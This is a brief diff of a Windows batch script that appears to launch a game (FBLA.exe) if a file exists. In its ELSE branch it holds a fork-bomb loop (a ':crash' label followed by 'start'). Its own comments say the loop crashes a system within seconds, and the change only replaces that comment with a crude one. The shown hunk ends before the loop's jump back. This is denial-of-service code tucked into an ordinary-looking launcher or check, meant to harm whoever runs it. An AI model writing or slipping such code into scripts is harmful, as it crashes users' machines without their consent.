@@ -6,7 +6,7 @@ IF EXIST %F% (
   ECHO %F% is existing
   REM REPLACE WITH RUN GAME.EXE for example 'start "" C:\Users\%USER%\...\FBLA.exe'
 ) ELSE (
-	REM literally a while loop that runs very very very fast, crashing a system within seconds even with 64gb ram :)
+	REM burn that shit down
 	@echo off
 	:crash
 	start
